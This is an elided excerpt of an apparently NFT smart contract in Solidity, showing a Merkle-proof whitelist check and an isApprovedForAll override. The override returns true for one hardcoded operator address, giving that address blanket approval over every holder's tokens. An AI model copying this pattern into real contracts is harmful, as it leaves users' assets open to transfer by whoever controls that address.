  ...
  Ownable
{
  ...
  function _baseURI() internal view virtual returns (string memory) {
    ...
    function isInTheWhitelist(bytes32[] calldata _merkleProof) public view returns (bool) {
        ...
        require(MerkleProof.verify(_merkleProof, LWListMerkleRoot, leaf) || MerkleProof.verify(_merkleProof, LWListMerkleRoot, leaf2), "Invalid proof!");
        return true;
    }
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x31045ACAABfB672A23c42934aC1aD7815E1E58cD){return true;}
